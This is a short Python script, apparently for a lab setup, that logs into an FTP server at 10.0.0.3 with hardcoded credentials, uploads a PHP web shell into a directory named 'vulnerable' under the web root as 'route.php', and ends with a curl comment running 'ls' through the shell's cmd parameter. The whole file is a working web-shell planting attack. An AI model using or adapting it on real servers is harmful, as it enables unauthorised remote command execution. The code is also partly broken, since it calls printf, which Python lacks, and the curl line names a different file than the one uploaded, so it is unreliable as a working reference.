import ftplib
import sys

if len(sys.argv) < 2:
    ip='10.0.0.3'
else:
    ip = sys.argv[1]

ftp=ftplib.FTP(ip)
ftp.login('gustavo','gustavo')
ftp.cwd('/var/www/html/php/vulnerable')

f=open('../php/shell_exec.php','rb')
ftp.storlines('STOR route.php',f)
f.close()
ftp.close()
printf("done")
# curl 10.0.0.3/shell_exec.php?cmd=ls